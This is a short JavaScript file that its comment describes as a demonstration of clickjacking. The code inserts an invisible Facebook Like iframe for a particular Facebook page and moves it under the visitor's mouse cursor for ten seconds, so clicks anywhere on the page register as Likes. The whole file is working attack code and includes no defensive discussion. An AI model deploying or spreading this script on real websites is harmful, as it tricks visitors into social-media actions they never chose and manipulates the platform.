/*
This code demonstrate a clickjack attack on websites. Similar to that of twitter & on facebook

*/

(function(){
    var tempX = 0,
        tempY = 0,

        IE = document.all ? true : false;
    if (!IE) document.captureEvents(Event.MOUSEMOVE);

    var like = document.createElement('iframe');
    like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(/*document.location.href*/ 'http://www.facebook.com/pages/Talkycloud/209382865871186') + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
    like.scrolling = 'no';
    like.frameBorder = 0;
    like.allowTransparency = 'true';
    like.style.border = 0;
    like.style.overflow = 'hidden';
    like.style.cursor = 'pointer';
    like.style.width = '53px';
    like.style.height =  '23px';
    like.style.position = 'absolute';
    like.style.opacity = 0; //Would be 0 if really used
    document.getElementsByTagName('body')[0].appendChild(like);

    window.addEventListener('mousemove', mouseMove, false);

    setTimeout(function(){
        document.getElementsByTagName('body')[0].removeChild(like);
        window.removeEventListener('mousemove', mouseMove, false);
    }, 10000);

    function mouseMove(e) {
        if (IE) {
            tempX = event.clientX + document.body.scrollLeft;
            tempY = event.clientY + document.body.scrollTop;
        } else {
            tempX = e.pageX;
            tempY = e.pageY;
        }

        if (tempX < 0) tempX = 0;
        if (tempY < 0) tempY = 0;

        like.style.top = (tempY - 8) + 'px';
        like.style.left = (tempX - 25) + 'px';

        return true
    }
})();